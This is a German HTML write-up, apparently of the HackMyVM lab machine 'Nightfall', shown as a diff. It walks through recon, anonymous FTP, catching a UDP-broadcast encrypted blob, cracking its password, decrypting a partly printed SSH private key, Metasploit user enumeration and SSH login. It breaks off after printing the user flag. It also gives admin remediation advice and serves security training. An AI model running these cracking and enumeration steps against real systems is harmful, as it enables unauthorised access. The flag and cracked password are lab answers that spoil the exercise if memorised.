@@ -1,0 +1,578 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nightfall - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body class="level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+ 
+    <div class="header-bg level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+        <h1>Nightfall - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2> <!-- H2 ohne Inline-Style, Farbe via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe via CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">lftp</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">nano</div> <!-- Implied by editing base_out -->
+                <div class="tool-item">base64</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">bruteforce-salted-openssl</div>
+                <div class="tool-item">openssl</div>
+                <div class="tool-item">ls</div> <!-- Implied by ll -->
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">ssh2john</div>
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div> <!-- Although command not found -->
+                <div class="tool-item">id</div>
+                <div class="tool-item">debugfs</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#enumeration">Enumeration & Data Discovery</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#poc">Proof of Concept (PrivEsc via debugfs)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.110</span>	<span class="command">08:00:27:86:03:67</span>	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird ausgeführt, um aktive Hosts im lokalen Netzwerk zu finden. Es wird ein Host mit der IP <span class="command">192.168.2.110</span> und der MAC-Adresse <span class="command">08:00:27:86:03:67</span> (zugeordnet zu PCS Systemtechnik GmbH / Oracle VirtualBox) identifiziert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreiche Identifizierung des Zielsystems "Nightfall". Die IP <span class="command">192.168.2.110</span> dient als Grundlage für weitere Scans.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die Ziel-IP. Führen Sie Port-Scans (z.B. mit `nmap`) durch, um offene Dienste zu ermitteln.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Reichweite von ARP-Scans einschränken. Überwachen Sie ungewöhnliche ARP-Aktivitäten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.110 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at <span class="command">2022-11-11 23:47 CET</span>
+Nmap scan report for nightfall.hmv (192.168.2.110)
+Host is up (0.00011s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">21/tcp open  ftp     ProFTPD</span>
+| ftp-anon: <span class="password">Anonymous FTP login allowed</span> (FTP code 230)
+|<span class="command">_-rw-r--r--   1 1001     1001          124 Jun 11  2021 darkness.txt</span>
+<span class="command">22/tcp open  ssh     OpenSSH 7.7</span> (protocol 2.0)
+| ssh-hostkey:
+|   2048 0c3f13546e6ee656d291ebad9536c68d (RSA)
+|   256 9be68e14397a17a38088cd772ec33b1a (ECDSA)
+|_  256 855a052a4bc0b236ea8ae28ab2efbcdf (ED25519)
+MAC Address: 08:00:27:86:03:67 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.11 ms nightfall.hmv (192.168.2.110)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in XX.XX seconds <span class="password"># Scanzeit nicht im Original</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan identifiziert zwei offene TCP-Ports:
+            <ul>
+                <li>Port <span class="command">21 (FTP)</span>: Läuft ProFTPD. Wichtigster Fund: Anonymer Login ist erlaubt (`ftp-anon: Anonymous FTP login allowed`), und im Root-Verzeichnis des FTP-Servers liegt eine Datei namens `<span class="command">darkness.txt</span>`.</li>
+                <li>Port <span class="command">22 (SSH)</span>: Läuft OpenSSH 7.7. Standard-SSH-Dienst.</li>
+            </ul>
+            Die OS-Erkennung deutet auf einen Linux-Kernel hin.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der offene FTP-Server mit erlaubtem anonymen Zugriff ist ein sofortiger Ansatzpunkt. Die Datei `darkness.txt` enthält wahrscheinlich wichtige Hinweise. Der SSH-Port ist ein weiteres potenzielles Ziel, falls Zugangsdaten gefunden werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verbinden Sie sich anonym mit dem FTP-Server (Port 21), laden Sie die Datei `darkness.txt` herunter und analysieren Sie deren Inhalt. Prüfen Sie, ob auf dem FTP-Server Schreibrechte bestehen oder andere Verzeichnisse zugänglich sind.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie anonymen FTP-Zugriff, es sei denn, er ist absolut notwendig und explizit sicher konfiguriert (z.B. beschränkter Lesezugriff auf ein bestimmtes Verzeichnis). Stellen Sie sicher, dass keine sensiblen Dateien über anonymen FTP zugänglich sind. Halten Sie ProFTPD und OpenSSH aktuell.</p>
+
+        </section>
+
+        <section id="enumeration">
+            <h2>Enumeration & Data Discovery</h2>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">lftp -u anonymous, 192.168.2.110</span></div>
+                     <pre>lftp anonymous@192.168.2.110:~> </pre>
+                     <div class="prompt">lftp anonymous@192.168.2.110:~> <span class="command">ls</span></div>
+                     <pre>-rw-r--r--   1 1001     1001          124 Jun 11  2021 <span class="command">darkness.txt</span></pre>
+                     <div class="prompt">lftp anonymous@192.168.2.110:/> <span class="command">get darkness.txt</span></div>
+                     <pre>124 Bytes übertragen</pre>
+                     <div class="prompt">lftp anonymous@192.168.2.110:/> <span class="command">exit</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit dem Kommandozeilen-FTP-Client `lftp` wird eine anonyme Verbindung zum FTP-Server auf <span class="command">192.168.2.110</span> hergestellt (`-u anonymous,`). Der Befehl `ls` bestätigt die Existenz der Datei `darkness.txt`. Mit `get darkness.txt` wird die Datei erfolgreich heruntergeladen. Anschließend wird die Verbindung mit `exit` beendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreicher Download der Hinweisdatei über den anonymen FTP-Zugriff.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie den Inhalt der heruntergeladenen `darkness.txt`-Datei.<br><strong>Empfehlung (Admin):</strong> Anonymen FTP-Zugriff deaktivieren oder stark einschränken.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat darkness.txt</span></div>
+                    <pre>
+In the darkness, there are invisible things happening that can be
+seen by taking a closer look at the horizon as a whole
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der heruntergeladenen Datei `darkness.txt` wird angezeigt. Er enthält einen kryptischen Hinweis: "In der Dunkelheit geschehen unsichtbare Dinge, die man sehen kann, wenn man den Horizont als Ganzes genauer betrachtet."</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Hinweis ist vage, aber klassisch für CTF-artige Szenarien. "Unsichtbare Dinge" und "Horizont als Ganzes" deuten oft auf Netzwerkverkehr hin, der nicht sofort offensichtlich ist (z.B. UDP-Broadcasts, Pakete auf ungewöhnlichen Ports, oder Daten, die in Paket-Headern oder Payloads versteckt sind). Es könnte auch auf Steganographie oder versteckte Verzeichnisse/Dateien hindeuten, aber der Netzwerkaspekt ist wahrscheinlicher.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie einen Netzwerk-Sniffer (z.B. `tcpdump` oder Wireshark) auf Ihrem Angreifer-System, um jeglichen Traffic vom Zielsystem (<span class="command">192.168.2.110</span>) aufzuzeichnen, insbesondere auf ungewöhnlichen Ports oder Protokollen (wie UDP). Beobachten Sie den Traffic über einen längeren Zeitraum oder während Interaktionen mit dem Ziel.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion aufgrund des Hinweises, aber generell sollte Netzwerk-Monitoring implementiert sein, um ungewöhnlichen Traffic zu erkennen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">lftp -u anonymous, 192.168.2.110</span></div>
+                     <pre>lftp anonymous@192.168.2.110:~> </pre>
+                     <div class="prompt">lftp anonymous@192.168.2.110:~> <span class="command">pwd</span></div>
+                     <pre>ftp://anonymous:@192.168.2.110</pre>
+                     <div class="prompt">lftp anonymous@192.168.2.110:~> <span class="command">cd /home</span></div>
+                     <pre>cd: Zugriff nicht möglich:550 /home: <span class="password">No such file or directory</span></pre>
+                     <div class="prompt">lftp anonymous@192.168.2.110:/> <span class="command">put regex</span></div> <span class="password"><-- Versuch, eine Datei hochzuladen</span>
+                     <pre>put: Zugriff nicht möglich:550 regex: <span class="password">Operation not permitted</span></pre>
+                     <div class="prompt">lftp anonymous@192.168.2.110:/> <span class="command">exit</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird erneut eine anonyme FTP-Verbindung hergestellt. `pwd` zeigt das aktuelle Verzeichnis. Der Versuch, in das Verzeichnis `/home` zu wechseln (`cd /home`), scheitert. Ebenso scheitert der Versuch, eine (lokale) Datei namens `regex` hochzuladen (`put regex`) mit einer Berechtigungsfehlermeldung.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass der anonyme FTP-Benutzer sehr eingeschränkte Rechte hat: kein Verzeichniswechsel über das Root-Verzeichnis hinaus und keine Schreibrechte.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der FTP-Server bietet keine weiteren direkten Angriffspunkte. Fokus auf die Analyse des Netzwerkverkehrs gemäß dem Hinweis aus `darkness.txt`.<br><strong>Empfehlung (Admin):</strong> Die Konfiguration des anonymen FTP-Zugriffs scheint hier (abgesehen von der Existenz an sich) korrekt restriktiv zu sein.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnup 24000</span></div>
+                     <pre>
+listening on [any] 24000 ...
+connect to [192.168.2.109] from (UNKNOWN) [192.168.2.110] 49018 <span class="password"><-- Verbindung vom Ziel!</span>
+
+<span class="command">U2FsdGVkX1+s5zqP533uCKtFYoSEEU41j01PSMGlBMiJ2v7ksXTzgHC5Dx2Nzc/uc0RZ6jLviSy</span>
+<span class="command">7051GAeGpyxB4r4eYYyoCanUnjYgM1FYcGUvm7kf4YcLIpkuuxaa33kPKLtzqwB9Tt5zven6Mt</span>
+<span class="command">[... sehr langer Base64-ähnlicher String ...]</span>
+<span class="command">dQRH9RQtj7tSHyvDNxX60Y46W/rEd7p7Y/cUeRnu/SRwHtkI2jmj2prA</span>
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Basierend auf dem Hinweis wird ein Netcat-Listener auf dem Angreifer-System gestartet, der auf UDP-Pakete (`-u`) auf Port <span class="command">24000</span> lauscht (`-l` listen, `-v` verbose, `-n` no DNS, `-p` port). Kurz darauf wird eine Verbindung bzw. ein Datenpaket vom Zielsystem (<span class="command">192.168.2.110</span>) empfangen. Der empfangene Inhalt ist ein sehr langer String, der wie Base64 aussieht, aber mit `<span class="command">U2FsdGVkX1+</span>` beginnt, was typisch für mit OpenSSL (insbesondere mit `enc` und einem Passwort) verschlüsselte Daten ist (Salted Format).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Hinweis aus `darkness.txt` hat sich bestätigt! Das Zielsystem sendet "unsichtbare" (UDP) Daten auf einem ungewöhnlichen Port. Diese Daten sind nicht nur Base64-kodiert, sondern auch verschlüsselt. Der nächste Schritt ist die Dekodierung und Entschlüsselung.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopieren Sie den gesamten empfangenen Datenblock. Speichern Sie ihn in einer Datei (z.B. `base_out`). Dekodieren Sie ihn mit `base64 -d` und speichern Sie das Ergebnis in einer Binärdatei (z.B. `out`). Analysieren Sie die Binärdatei (`file out`) und versuchen Sie, das Passwort für die Entschlüsselung zu knacken (z.B. mit `bruteforce-salted-openssl` oder John the Ripper) und die Daten dann mit `openssl enc -d` zu entschlüsseln.<br><strong>Empfehlung (Admin):</strong> Untersuchen Sie dringend, welcher Prozess auf dem Zielsystem diese verschlüsselten Daten per UDP sendet und warum. Dies ist ein schwerwiegendes Sicherheitsrisiko und deutet auf eine Kompromittierung oder eine extrem unsichere Konfiguration hin.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/bruteforce-salted-openssl]
+└─# <span class="command">nano base_out</span></div>
+                     <pre>[Editor geöffnet, Base64-Daten eingefügt und gespeichert]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/bruteforce-salted-openssl]
+└─# <span class="command">cat base_out | base64 -d > out</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/bruteforce-salted-openssl]
+└─# <span class="command">file out</span></div>
+                     <pre>out: <span class="command">openssl enc'd data with salted password</span></pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Die über Netcat empfangenen Base64-Daten werden in die Datei `base_out` gespeichert. Anschließend werden diese Daten mit `base64 -d` dekodiert und das binäre Ergebnis in die Datei `out` geschrieben. Der `file`-Befehl bestätigt, dass `out` verschlüsselte Daten im OpenSSL-Format mit Salt enthält.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Daten wurden erfolgreich vorbereitet. Die Bestätigung durch `file` ist wichtig, um das richtige Werkzeug für das Knacken des Passworts auszuwählen.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie ein spezialisiertes Tool wie `bruteforce-salted-openssl` oder `john` (mit `openssl2john`), um das Passwort für die Datei `out` zu knacken. Verwenden Sie gängige Wortlisten wie `rockyou.txt`.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/bruteforce-salted-openssl]
+└─# <span class="command">bruteforce-salted-openssl -t 6 -f /usr/share/wordlists/rockyou.txt -d sha256 out</span></div>
+                    <pre>
+Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.
+
+Tried passwords: 89957
+Tried passwords per second: inf
+Last tried password: almendrita
+
+Password candidate: <span class="password">amoajesus</span> <span class="password"><-- Erfolg!</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Tool `bruteforce-salted-openssl` wird verwendet, um das Passwort für die verschlüsselte Datei `out` zu finden. `-t 6` gibt die Anzahl der Threads an. `-f /usr/share/wordlists/rockyou.txt` spezifiziert die Wortliste. `-d sha256` gibt den Hash-Algorithmus an, der vermutlich für die Schlüsselableitung verwendet wird. Das Tool findet erfolgreich das Passwort: `<span class="password">amoajesus</span>`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Passwort für die verschlüsselten Daten wurde erfolgreich geknackt. Dies ermöglicht nun die Entschlüsselung der ursprünglichen Daten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie `openssl enc` mit dem gefundenen Passwort `<span class="password">amoajesus</span>`, um die Datei `out` zu entschlüsseln.<br><strong>Empfehlung (Admin):</strong> Wenn sensible Daten verschlüsselt übertragen werden müssen, verwenden Sie starke, nicht erratbare Passwörter und sichere Schlüsselaustauschmechanismen. Vermeiden Sie es, verschlüsselte Daten unaufgefordert zu senden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/bruteforce-salted-openssl]
+└─# <span class="command">openssl enc -aes-256-cbc -d -in out -out decrypt_file</span></div>
+                    <pre>
+enter AES-256-CBC decryption password:<span class="password">[Passworteingabe: amoajesus]</span>
+<span class="command">* WARNING : deprecated key derivation used.</span>
+<span class="command">Using -iter or -pbkdf2 would be better.</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `openssl enc` wird verwendet, um die Datei `out` zu entschlüsseln. `-aes-256-cbc` gibt den Verschlüsselungsalgorithmus an (muss mit dem bei der Verschlüsselung verwendeten übereinstimmen). `-d` steht für Entschlüsselung. `-in out` ist die Eingabedatei, `-out decrypt_file` die Ausgabedatei. Das zuvor geknackte Passwort `<span class="password">amoajesus</span>` wird eingegeben. Die Warnung weist auf eine veraltete Schlüsselableitungsmethode hin, die Entschlüsselung ist aber erfolgreich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die verschlüsselten Daten wurden erfolgreich entschlüsselt und in `decrypt_file` gespeichert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie den Inhalt der Datei `decrypt_file`, um festzustellen, welche Informationen exfiltriert wurden.<br><strong>Empfehlung (Admin):</strong> Bei Verwendung von OpenSSL zur Verschlüsselung sollten moderne Optionen wie `-pbkdf2` verwendet werden, um die Schlüsselableitung gegen Brute-Force-Angriffe zu stärken.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/bruteforce-salted-openssl]
+└─# <span class="command">ll</span></div> <span class="password"><-- alias für ls -l oder ls -la</span>
+                    <pre>
+insgesamt 108
+[...]
+-rw-r--r-- 1 root root  <span class="command">1679</span> 12. Nov 00:18 decrypt_file
+[...]
+-rw-r--r-- 1 root root  <span class="command">1696</span> 12. Nov 00:15 out
+[...]
+</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/bruteforce-salted-openssl]
+└─# <span class="command">cat decrypt_file</span></div>
+                     <pre>
+<span class="password">-----BEGIN RSA PRIVATE KEY-----</span>
+<span class="password">MIIEpAIBAAKCAQEA4jJ321FfmddxmAyA+EUtxfMApwY32Zs1THtaWbU4jZ10Mzh8</span>
+<span class="password">/nRSWdXECqE5naPeNbUarNMYj2QIm3kn1w5LTB+RGYuZBfJixmD15dnQly5ABG5</span>
+<span class="password">[... Langer privater SSH RSA Schlüssel ...]</span>
+<span class="password">gnk57/z5ifJLq8MAdpIgfQKBgAPkmmcu6LYQyBUF7/pRE4/Kg4re+R0/XmqEmkit</span>
+<span class="password">0BEPKvQkhUJUEkfLCvVN/euRxe61PmkUNKJwI2Zz8toKYCoFMUxwoeMygNxwqMwU</span>
+<span class="password">eckacpECgYA8xTCDoliocyinyJ7EdI4J0/pgbHEcwJ3XeZCh+WyDJZGB/6cSGyI8</span>
+<span class="password">isAZnRCL0ml2ukrq+mdQ2WjSQLxNZGrM0ePxl5Qvv2Bzeyn2gSKInQlYZ5rAItkR</span>
+<span class="password">i3gLubHaM/au4vhu65nmM5ni7R9bUKZ3sXR74+tXlKXsupuwJR0aDA</span>
+<span class="password">-----END RSA PRIVATE KEY-----</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `ll` (oft ein Alias für `ls -l` oder `ls -la`) zeigt die Dateigrößen an. `cat decrypt_file` gibt den Inhalt der entschlüsselten Datei aus. Es handelt sich um einen privaten SSH-RSA-Schlüssel.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Über den UDP-Broadcast wurden die Daten eines privaten SSH-Schlüssels exfiltriert. Dieser Schlüssel gehört wahrscheinlich einem Benutzer auf dem Zielsystem und ermöglicht den SSH-Zugriff.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Speichern Sie den Schlüssel in einer Datei (z.B. `ssh_rsa`), setzen Sie die korrekten Berechtigungen (`chmod 600 ssh_rsa`). Versuchen Sie, mit `ssh2john` einen eventuellen Passphrasen-Hash zu extrahieren (obwohl er wahrscheinlich keine hat). Finden Sie den zugehörigen Benutzernamen heraus (z.B. durch erneute Enumeration, Raten von Standardnamen oder Verwendung von Metasploit zur Benutzerenumeration) und versuchen Sie dann, sich mit dem Schlüssel via SSH anzumelden.<br><strong>Empfehlung (Admin):</strong> Untersuchen Sie, wem dieser Schlüssel gehört und wie er exfiltriert werden konnte. Widerrufen Sie den Schlüssel sofort (entfernen Sie den öffentlichen Teil aus der `authorized_keys`-Datei des betroffenen Benutzers). Beheben Sie die Ursache des UDP-Datenlecks.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/bruteforce-salted-openssl]
+└─# <span class="command">nano ssh_rsa</span></div>
+                     <pre>[Editor geöffnet, Key eingefügt und gespeichert]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/bruteforce-salted-openssl]
+└─# <span class="command">chmod 600 ssh_rsa</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/bruteforce-salted-openssl]
+└─# <span class="command">ssh2john ssh_rsa > hash</span></div>
+                     <pre><span class="password">ssh_rsa has no password!</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der entschlüsselte private SSH-Schlüssel wird in die Datei `ssh_rsa` gespeichert und die Berechtigungen werden mit `chmod 600` korrekt gesetzt. Anschließend wird `ssh2john` verwendet, um zu prüfen, ob der Schlüssel mit einer Passphrase geschützt ist und um ggf. den Hash für John the Ripper zu extrahieren. Die Ausgabe "ssh_rsa has no password!" bestätigt, dass der Schlüssel nicht passphrasengeschützt ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Schlüssel ist einsatzbereit und erfordert keine weitere Passphrase. Es muss nur noch der zugehörige Benutzer gefunden werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie SSH-Username-Enumeration durch (z.B. mit Metasploit oder anderen Tools), um den Benutzer zu finden, dem dieser Schlüssel gehört.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 > <span class="command">search ssh enum user</span></div>
+                    <pre>
+Matching Modules
+   #  Name                                           Disclosure Date  Rank    Check  Description
+   -  ----                                           ---------------  ----    -----  -----------
+[...]
+   3  auxiliary/scanner/ssh/ssh_enumusers                             normal  No     SSH Username Enumeration
+[...]
+</pre>
+                    <div class="prompt metasploit-prompt">msf6 > <span class="command">use 3</span></div>
+                    <pre>msf6 auxiliary(scanner/ssh/ssh_enumusers) ></pre>
+                    <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/ssh/ssh_enumusers) > <span class="command">options</span></div>
+                    <pre>
+Module options (auxiliary/scanner/ssh/ssh_enumusers):
+[...]
+   RHSTS                         yes       The target host(s)...
+   RPORT         22               yes       The target port
+   USER_FILE                      no        File containing usernames, one per line
+[...]
+</pre>
+                    <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/ssh/ssh_enumusers) > <span class="command">set CHECK_FALSE true</span></div>
+                    <pre>CHECK_FALSE => true</pre>
+                    <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/ssh/ssh_enumusers) > <span class="command">set user_file /usr/share/wordlists/usernames.txt</span></div>
+                    <pre>user_file => /usr/share/wordlists/usernames.txt</pre>
+                    <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/ssh/ssh_enumusers) > <span class="command">set RHSTS nightfall.hmv</span></div> <span class="password"><-- Annahme: nightfall.hmv wurde zu /etc/hosts hinzugefügt</span>
+                    <pre>RHSTS => nightfall.hmv</pre>
+                    <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/ssh/ssh_enumusers) > <span class="command">run</span></div>
+                    <pre>
+[*] 192.168.2.110:22 - SSH - Using malformed packet technique
+[*] 192.168.2.110:22 - SSH - Checking for false positives
+[*] 192.168.2.110:22 - SSH - Starting scan
+[+] 192.168.2.110:22 - SSH - User 'mail' found
+[+] 192.168.2.110:22 - SSH - User 'root' found
+[+] 192.168.2.110:22 - SSH - User 'news' found
+[+] 192.168.2.110:22 - SSH - User 'man' found
+[+] 192.168.2.110:22 - SSH - User 'bin' found
+[+] 192.168.2.110:22 - SSH - User 'games' found
+[+] <span class="command">192.168.2.110:22 - SSH - User 'abraham' found</span>
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Metasploit Framework (`msfconsole`) wird gestartet. Das Modul `auxiliary/scanner/ssh/ssh_enumusers` wird geladen und konfiguriert, um gültige Benutzernamen auf dem SSH-Server des Ziels (`nightfall.hmv` / `192.168.2.110`) zu finden. Es verwendet eine Wortliste (`usernames.txt`) und die "Malformed Packet"-Technik. Der Scan identifiziert mehrere Systembenutzer sowie einen Nicht-Standard-Benutzer: `<span class="command">abraham</span>`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreiche Benutzerenumeration. Der Benutzer `<span class="command">abraham</span>` ist der wahrscheinlichste Kandidat für den zuvor gefundenen SSH-Schlüssel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit dem privaten Schlüssel (`ssh_rsa`) als Benutzer `<span class="command">abraham</span>` via SSH am Zielsystem anzumelden.<br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie den SSH-Server so, dass Benutzerenumeration erschwert wird (z.B. durch Verzögerungen oder generische Fehlermeldungen, obwohl dies oft nur begrenzte Wirkung hat). Vermeiden Sie leicht erratbare Benutzernamen.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mv /root/Hackingtools/bruteforce-salted-openssl/ssh_rsa .</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh -i ssh_rsa abraham@nightfall.hmv</span></div>
+                     <pre>
+Last login: Sun Jun 20 11:36:51 2021 from 192.168.0.28
+abraham@nightfall:~$ <span class="password"># Login erfolgreich!</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der zuvor vorbereitete private SSH-Schlüssel (`ssh_rsa`) wird in das aktuelle Verzeichnis verschoben (dieser Schritt ist optional, der Pfad könnte auch direkt im `ssh`-Befehl angegeben werden). Anschließend wird mit `ssh -i ssh_rsa abraham@nightfall.hmv` versucht, sich als Benutzer `abraham` mit dem Schlüssel anzumelden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Initial Access erfolgreich! Die Kombination aus exfiltriertem Schlüssel und enumeriertem Benutzernamen ermöglicht den Zugang zum System als Benutzer `abraham`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der Enumeration als Benutzer `abraham`. Suchen Sie nach `sudo`-Rechten, SUID-Binaries, Konfigurationsdateien, Cronjobs und anderen Hinweisen für die Privilege Escalation. Suchen Sie die User-Flag (`user.txt`).<br><strong>Empfehlung (Admin):</strong> Untersuchen, wie der private Schlüssel von `abraham` kompromittiert werden konnte (UDP-Leak). Schlüssel widerrufen. Ursache des Leaks beheben.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">abraham@nightfall:~$ <span class="command">sudo -l</span></div>
+                    <pre>-bash: sudo: <span class="password">command not found</span></pre>
+                    <div class="prompt">abraham@nightfall:~$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">c02546146dfcf2bec351c4fece2dec21</span></pre>
+                    <div class="prompt">abraham@nightfall:~$ <span class="command">cat door.txt</span></div>
+                    <pre>
